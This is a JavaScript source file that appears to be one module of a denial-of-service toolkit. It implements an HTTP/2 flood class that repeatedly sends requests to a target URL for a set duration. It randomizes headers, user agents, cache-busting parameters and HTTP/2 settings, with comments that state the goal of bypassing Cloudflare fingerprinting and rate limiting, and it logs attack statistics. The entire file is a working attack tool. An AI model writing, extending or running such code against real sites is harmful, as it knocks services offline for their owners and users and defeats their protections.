import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { proxyRotator } from '../../utils/proxy-rotator.js';
import pkg from 'https-proxy-agent';
const { HttpsProxyAgent } = pkg;

/**
 * HTTP/2 Optimized - No Drop After 50k!
 * Features:
 * - Connection pooling
 * - Proper cleanup
 * - Memory management
 * - Rate limiting prevention
 */
export class HTTP2Optimized {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Stats tracking
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            totalBytes: 0,
            totalPackets: 0
        };
        
        // Connection pool - SINGLE connection per instance
        this.connectionPool = [];
        this.maxConnections = 1; // Only 1 connection per instance!
        this.requestsPerConnection = 100; // Rotate after 100 requests
        this.connectionCounter = new Map();
    }

    generateHeaders() {
        // Advanced CF bypass headers
        const chromeVersions = ['120.0.0.0', '121.0.0.0', '122.0.0.0', '123.0.0.0'];
        const platforms = ['Windows', 'macOS', 'Linux'];
        const platform = Tools.randomChoice(platforms);
        const chromeVer = Tools.randomChoice(chromeVersions);
        
        const headers = {
            ':method': 'GET',
            ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + '_=' + Date.now() + '&r=' + Math.random(),
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.host,
            'cache-control': 'max-age=0',
            'sec-ch-ua': `"Not_A Brand";v="8", "Chromium";v="${chromeVer.split('.')[0]}", "Google Chrome";v="${chromeVer.split('.')[0]}"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': `"${platform}"`,
            'upgrade-insecure-requests': '1',
            'user-agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : `Mozilla/5.0 (${platform === 'Windows' ? 'Windows NT 10.0; Win64; x64' : platform === 'macOS' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['referer'] = Tools.randomChoice(this.referers);
        }

        return headers;
    }

    async getConnection() {
        // Aggressive cleanup of old connections
        this.connectionPool = this.connectionPool.filter(conn => {
            const count = this.connectionCounter.get(conn) || 0;
            if (count >= this.requestsPerConnection || conn.destroyed) {
                try {
                    conn.close();
                    conn.destroy(); // Force destroy
                } catch (e) {}
                this.connectionCounter.delete(conn);
                return false;
            }
            return true;
        });
        
        // Force GC hint if too many connections
        if (this.connectionPool.length >= this.maxConnections) {
            if (global.gc) {
                global.gc();
            }
        }

        // Create new connection if needed
        if (this.connectionPool.length < this.maxConnections) {
            try {
                // Get rotating proxy
                const proxy = proxyRotator.getNextProxy();
                // Randomize HTTP/2 SETTINGS to bypass CF fingerprinting
                const settingsVariations = [
                    { headerTableSize: 4096, initialWindowSize: 65535, maxConcurrentStreams: 100, maxFrameSize: 16384, maxHeaderListSize: 262144 },
                    { headerTableSize: 8192, initialWindowSize: 65536, maxConcurrentStreams: 128, maxFrameSize: 16385, maxHeaderListSize: 524288 },
                    { headerTableSize: 16384, initialWindowSize: 131072, maxConcurrentStreams: 256, maxFrameSize: 32768, maxHeaderListSize: 1048576 },
                    { headerTableSize: 32768, initialWindowSize: 262144, maxConcurrentStreams: 512, maxFrameSize: 65536, maxHeaderListSize: 2097152 }
                ];
                const randomSettings = Tools.randomChoice(settingsVariations);
                
                const connectOptions = {
                    rejectUnauthorized: false,
                    maxSessionMemory: 10,
                    settings: {
                        enablePush: false,
                        headerTableSize: randomSettings.headerTableSize,
                        initialWindowSize: randomSettings.initialWindowSize,
                        maxConcurrentStreams: randomSettings.maxConcurrentStreams,
                        maxFrameSize: randomSettings.maxFrameSize,
                        maxHeaderListSize: randomSettings.maxHeaderListSize
                    }
                };
                
                // Proxy disabled temporarily - causes memory leak with HTTP/2
                // TODO: Fix proxy implementation for HTTP/2
                // if (proxy) {
                //     const proxyUrl = `http://${proxy}`;
                //     connectOptions.agent = new HttpsProxyAgent(proxyUrl);
                // }
                
                const client = http2.connect(this.url.origin, connectOptions);

                client.on('error', () => {
                    try {
                        client.close();
                    } catch (e) {}
                });

                this.connectionPool.push(client);
                this.connectionCounter.set(client, 0);
                
                return client;
            } catch (e) {
                return null;
            }
        }

        // Return existing connection (round-robin)
        return this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
    }

    async sendRequest(client) {
        if (!client || client.destroyed) return;

        try {
            const req = client.request(this.generateHeaders());
            
            // Increment connection counter
            const count = this.connectionCounter.get(client) || 0;
            this.connectionCounter.set(client, count + 1);

            // Aggressive cleanup - close request ASAP
            req.on('response', () => {
                this.stats.successfulRequests++;
                this.stats.totalPackets++;
                REQUESTS_SENT.add(1);
                req.close(); // Close immediately after response
            });

            req.on('data', (chunk) => {
                this.stats.totalBytes += chunk.length;
                BYTES_SENT.add(chunk.length);
            });

            req.on('error', () => {
                this.stats.failedRequests++;
                try { req.close(); } catch (e) {}
            });

            req.on('end', () => {
                try { req.close(); } catch (e) {}
            });

            req.end();
            
            // Count immediately
            this.stats.totalRequests++;
            this.stats.totalBytes += 200;
            BYTES_SENT.add(200);

            // Force close after 1 second timeout
            setTimeout(() => {
                try { req.close(); } catch (e) {}
            }, 1000);

        } catch (e) {
            this.stats.failedRequests++;
        }
    }

    async attack() {
        const client = await this.getConnection();
        if (!client) return;

        // Send in tiny batches with proper delays
        const batchSize = 5; // Ultra small batches
        for (let i = 0; i < this.rpc; i += batchSize) {
            const end = Math.min(i + batchSize, this.rpc);
            for (let j = i; j < end; j++) {
                this.sendRequest(client);
            }
            // Delay between batches for GC
            if (i + batchSize < this.rpc) {
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        }
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        const startTime = Date.now();

        logger.info(`🚀 HTTP2-Optimized attack started`);
        logger.info(`   Target: ${this.url.href}`);
        logger.info(`   Duration: ${this.duration}s`);
        logger.info(`   RPC: ${this.rpc}`);

        // Stats reporter
        const statsInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const rps = Math.floor(this.stats.totalRequests / elapsed);
            logger.info(`📊 [${elapsed}s] Requests: ${this.stats.totalRequests.toLocaleString()} | RPS: ${rps} | Success: ${this.stats.successfulRequests} | Failed: ${this.stats.failedRequests}`);
        }, 5000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }

        clearInterval(statsInterval);

        // Cleanup all connections
        for (const conn of this.connectionPool) {
            try {
                conn.close();
            } catch (e) {}
        }
        this.connectionPool = [];
        this.connectionCounter.clear();

        const totalTime = Math.floor((Date.now() - startTime) / 1000);
        const avgRps = Math.floor(this.stats.totalRequests / totalTime);

        logger.success(`✅ HTTP2-Optimized attack completed!`);
        logger.info(`   Total Requests: ${this.stats.totalRequests.toLocaleString()}`);
        logger.info(`   Success: ${this.stats.successfulRequests.toLocaleString()}`);
        logger.info(`   Failed: ${this.stats.failedRequests.toLocaleString()}`);
        logger.info(`   Average RPS: ${avgRps}`);
        logger.info(`   Total Data: ${(this.stats.totalBytes / 1024 / 1024).toFixed(2)} MB`);
    }

    stop() {
        this.active = false;
        
        // Cleanup
        for (const conn of this.connectionPool) {
            try {
                conn.close();
            } catch (e) {}
        }
        this.connectionPool = [];
        this.connectionCounter.clear();
    }
}

// Export for HTTP2-CF alias
export class HTTP2CFBypass extends HTTP2Optimized {}
